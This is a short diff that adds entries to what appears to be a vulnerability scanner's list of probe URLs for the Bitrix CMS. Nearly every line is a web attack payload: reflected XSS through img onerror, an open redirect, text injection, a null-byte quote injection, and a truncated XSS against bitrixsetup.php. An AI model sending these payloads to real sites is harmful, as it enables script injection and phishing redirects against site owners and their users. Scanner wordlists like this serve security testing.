@@ -4,3 +4,8 @@
 /bitrix/components/bitrix/mobileapp.list/ajax.php?items[1][TITLE]=TEXT+INJECTION!+PLEASE+CLICK+HERE!&items[1][DETAIL_LINK]=https://metascan.ru
 /bitrix/tools/imagepg.php?img=//metascan.ru/assets/images/logo.svg
 /bitrix/components/bitrix/photogallery_user/templates/.default/galleries_recalc.php?AJAX=Y&arParams[PERMISSION]=W&arParams[IBLOCK_ID]=1%00%27}};alert(
+/bitrix/components/bitrix/socialnetwork.events_dyn/get_message_2.php?log_cnt=<img%20onerror%E2%80%A9=alert(document.domain)%20src=1>%20METASCAN
+{{paths}}
+/bitrix/tools/track_mail_click.php?url=https://site%252F@metascan.ru/
+/bitrix/components/bitrix/mobileapp.list/ajax.php?items[1][TITLE]=TEXT+INJECTION!+PLEASE+CLICK+HERE!&items[1][DETAIL_LINK]=https://google.com
+/bitrixsetup.php?action=UNPACK&filename=<img src=
